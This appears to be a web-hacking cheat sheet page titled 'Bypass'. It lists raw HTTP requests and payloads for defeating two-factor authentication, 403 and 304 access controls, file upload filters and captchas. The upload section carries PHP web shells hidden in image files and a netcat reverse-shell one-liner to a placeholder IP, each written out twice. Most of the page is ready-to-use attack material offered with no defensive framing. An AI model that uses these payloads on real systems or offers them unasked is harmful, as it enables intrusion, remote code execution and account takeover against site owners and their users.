---
title: "Bypass"
draft: false
images: []
description: "Bypassing 2FA, 304, 403 and file upload filters"
lead: "Bypassing 2FA, 304, 403 and file upload filters"
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

## 2FA
### Response manipulation
```
HTTP/1.1 404 Not Found
...
{"code": false}
​
-------------------------------
​
Change it to {"code": true}
```
### Status code manipulation
```
HTTP/1.1 404 Not Found
...
{"code": false}
​```
--------------------------------
​
Change it to HTTP/1.1 200 OK
```
### 2FA Code in Response
Always check the response!
```
HTTP/1.1 200 OK
...
{"email": "victim@gmail.com", "code": "101010"}
```
### Missing 2FA Code integrity validation, code for any user account can be used
```
POST /2fa/
Host: vuln.com
...
email=attacker@gmail.com&code=382923
```
```
POST /2fa/
Host: vuln.com
...
email=victim@gmail.com&code=382923
```
### 2FA code reusability, same code can be reused.
Enter code 000000
```
POST /2fa/
Host: vuln.com
...
code=00000
```
Enter code "null"
```
POST /2fa/
Host: vuln.com
...
code=null
```

## 304

### Delete "If-None-Match" header
```
GET /admin HTTP/1.1
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld"

----------------------------------------------

GET /admin HTTP/1.1
Host: target.com
```
### Adding random character in the end of "If-None-Match" header
```
GET /admin HTTP/1.1
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld"

------------------------------------------------

GET /admin HTTP/1.1
Host: target.com
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld" b
```

## 403

### Using "X-Original-URL" header
```
GET /admin HTTP/1.1
Host: target.com

----------------------------

GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```
### Appending %2e after the first slash
```
http://target.com/admin => 403

-----------------------------------

http://target.com/%2e/admin => 200
```
### Try add dot (.) and slash (/) in the URL
```
http://target.com/admin => 403

----------------------------------------

http://target.com/admin/. => 200
http://target.com//admin// => 200
http://target.com/./admin/./ => 200
```
### Add "..;/" after the directory name
```
http://target.com/admin

-----------------------------

http://target.com/admin..;/
```
### Try to uppercase the alphabet in the url
```
http://target.com/admin

----------------------------

http://target.com/aDmIN
```
### Via Web Cache Poisoning
```
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```

## File Upload

### What can you reach in case you uploaded?
```
ASP / ASPX / PHP5 / PHP / PHP3 --> WEBSHELL / RCE
SVG --> STORED XSS / SSRF / XXE
GIF --> STORED XSS / SSRF
CSV --> CSV INJECTION
XML --> XXE / STORED XSS / SSRF
AVI --> LFI / SSRF
HTML / JSON --> HTML INJECTION / XSS / OPEN REDIRECT
PNG / JPEG --> PIXEL FLOOD ATTACK (DOS)
ZIP --> RCE VIA LFI / DOS
PDF / PPTX --> SSRF / BLIND XXE/ STORED XSS
```
### Image Upload Bypass
```
- Change extension: .pHp3 or pHp3.jpg
- Modify mimetype: Content-type: image/jpeg
- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
- Add gif header: 
    . GIF89a;

    . JFIF; <?php echo "<pre>"; system($_GET['cmd']); ?>

    . GIF89 <reverse_shell|shell>

    . echo '<?php' >> shell.php.png
      echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> shell.php.png
      echo '?>' >> shell.php.png

- All at the same time.
```
### Change the ContentType
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

############################################################################

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/jpeg
```
### Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
Content-Type: application/x-php

############################################################################

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```
### Upload the payload, but start with GIF89a;
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```
### Bypass getimagesize()
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
```
### Add GIF header
```
. GIF89a;
. JFIF; <?php echo "<pre>"; system($_GET['cmd']); ?>
. GIF89 <reverse_shell|shell>
. echo '<?php' >> shell.php.png
. echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> shell.php.png
. echo '?>' >> shell.php.png
```
### Using null byte in filename
```
file.php%00.gif
```
### Using double extensions for the uploaded file
```
file.jpg.php
```
### Uploading an unpopular php extensions (php4,php5,php6,phtml)
```
file.php5
```
### Try to randomly capitalizes the file extension
```
file.pHP5
```

## Captcha

### Try changing the request method, for example POST to GET
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123

------------------------------------------------------------------------------

GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
Host: target.com
[...]
```
### Try remove the value of the captcha parameter
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=&_Username=daffa&_Password=test123
```
### Try reuse old captcha token
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```
### Convert JSON data to normal request parameter
```
POST / HTTP 1.1
Host: target.com
[...]

{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}


--------------------------------------------------------------------------------------

POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```
### Try custom header to bypass captcha
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
### Change some specific characters of the captcha parameter and see if it is possible to bypass the restriction.
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```